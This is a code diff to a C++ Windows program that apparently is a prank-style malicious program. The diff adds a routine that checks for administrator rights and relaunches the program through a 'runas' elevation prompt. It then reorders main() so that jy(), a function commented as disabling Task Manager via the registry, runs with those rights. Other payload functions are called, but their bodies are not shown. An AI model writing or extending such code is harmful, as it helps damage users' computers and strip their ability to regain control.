@@ -7,6 +7,32 @@
 #include <cstdlib>
 #include <ctime>
 
+
+bool IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
+            isAdmin = FALSE;
+        }
+        FreeSid(adminGroup);
+    }
+    return isAdmin;
+}
+ 
+void RequestAdminPrivileges() {
+    if (!IsRunningAsAdmin()) {
+        WCHAR modulePath[MAX_PATH];
+        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+        
+        ShellExecuteW(NULL, L"runas", modulePath, NULL, NULL, SW_SHOW);
+        ExitProcess(0);
+    }
+}
+
 void jy()
 {
 	// 1. 禁用任务管理器（注册表）
@@ -116,11 +142,9 @@ MessageBoxA(NULL,"该代码有可能危害到您的计算机，是否运行？","阿米诺",MB_OK|MB_SY
 
 int main()
 {
-	HWND hwnd;
-	hwnd=GetConsoleWindow();	//处理顶级窗口的类名和窗口名称匹配指定的字符串,不搜索子窗口。
-	ShowWindow(hwnd,SW_HIDE);				//设置指定窗口的显示状态
+	RequestAdminPrivileges();
+	jy();				//设置指定窗口的显示状态
 	tc();
-	jy();
 	bz();
 	wjj();
 	int i=1;
